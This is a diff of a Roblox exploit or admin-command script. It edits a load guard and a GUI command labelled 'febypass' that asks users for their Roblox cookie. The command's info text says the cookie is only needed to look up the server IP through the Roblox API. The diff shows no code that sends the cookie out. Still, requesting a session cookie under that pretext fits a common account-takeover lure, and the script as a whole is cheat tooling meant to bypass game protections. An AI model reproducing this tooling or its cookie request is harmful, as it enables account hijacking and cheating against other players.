@@ -9,19 +9,13 @@
 
 -- Instances: 170 | Scripts: 2 | Modules: 0 | Tags: 0
 
-local env = getgenv and getgenv() or (_G or shared)
-
-if not env.E_COMMANDS_LOADED then
-	env.E_COMMANDS_LOADED = true
-else
-	return
-end
-
 local function SafeGetService(name) -- credits to nameless admin
 	local Service = (game.GetService);
 	local Reference = (cloneref) or function(reference) return reference end
 	return Reference(Service(game, name));
 end
+
+local env = getgenv and getgenv() or (_G or shared)
 
 task.spawn(function()
 	for _, rems in pairs(SafeGetService("ReplicatedStorage"):GetChildren()) do
@@ -1587,14 +1581,14 @@ G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], 
 G2L["84"]["ZIndex"] = 2147483647;
 G2L["84"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["84"]["BackgroundTransparency"] = 1;
-G2L["84"]["Name"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];
-G2L["84"]["Text"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];
+G2L["84"]["Name"] = [[ >febypass/<roblox cookie (for roblox api)>]];
+G2L["84"]["Text"] = [[ >febypass/<roblox cookie (for roblox api)>]];
 
 
 -- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >febypass/<roblox cookie hash (for roblox api)>.Info
 G2L["85"] = Instance.new("StringValue", G2L["84"]);
 G2L["85"]["Name"] = [[Info]];
-G2L["85"]["Value"] = [[Command Info: This like looks way to legit to not be real... The reason it needs the roblox cookie hash because of me using roblox api to get the server ip since i couldnt find any other ways of getting the server ip to make it work]];
+G2L["85"]["Value"] = [[Command Info: This like looks way to legit to not be real... The reason it needs the roblox cookie is because of me using roblox api to get the server ip since i couldnt find any other ways of getting the server ip to make it work]];
 
 
 -- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vrsetup
